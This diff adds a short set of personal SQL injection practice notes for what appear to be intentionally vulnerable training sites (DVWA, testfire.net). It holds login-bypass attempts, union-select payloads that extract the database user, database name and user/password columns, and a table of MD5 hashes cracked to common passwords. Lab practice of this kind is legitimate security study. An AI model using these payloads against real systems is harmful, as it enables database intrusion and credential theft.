@@ -1,0 +1,44 @@
+     DVWA
+
+try this for sql injection
+1,2,3,4,5
+
+
+
+http://testfire.net/login.jsp
+
+Syntax error: Encountered "=" at line 1, column 48. 
+
+username     'OR=
+password      ==
+
+
+Syntax error: Encountered "=" at line 1, column 65. 
+
+username   'OR
+password    ==
+
+this is for sql database
+
+' union select null#
+' union select null,user()#
+' union select null,database()#
+' union select null,null#
+
+'union select null,concat(user,password) from users#
+'union select null,concat(user,0xa0,password) from users#
+
+
+https://crackstation.net/
+
+
+
+HASH KEY                           TYPE     RESULTS
+
+5f4dcc3b5aa765d61d8327deb882cf99   MD5      password
+e99a18c428cb38d5f260853678922e03   MD5      abc123
+8d3533d75ae2c3966d7e0d4fcc69216b   MD5      charley
+0d107d09f5bbe40cade3de5c71e9e9b7   MD5      letmein
+5f4dcc3b5aa765d61d8327deb882cf99   MD5      password
+
+
